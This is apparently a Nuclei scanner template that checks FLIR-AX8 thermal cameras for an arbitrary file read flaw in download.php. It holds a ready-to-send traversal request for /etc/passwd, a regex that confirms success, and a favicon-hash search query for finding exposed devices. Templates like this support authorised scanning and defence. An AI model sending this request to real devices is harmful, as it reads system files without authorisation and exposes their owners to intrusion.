id: flir-download-traversal
info:
  name: FLIR-AX8 热成像仪 download.php - traversal
  author: leadlife
  severity: high
  description: FLIR-AX8热成像仪download.php存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
  reference: 
    - https://github.com/wy876/POC/blob/main/FLIR/FLIR-AX8%E7%83%AD%E6%88%90%E5%83%8F%E4%BB%AAdownload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: demo
    hunter-query: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
  tags: flir,traversal

http:
  - raw:
      - |
        POST /download.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: ****
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 24

        file=../../../etc/passwd
        
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"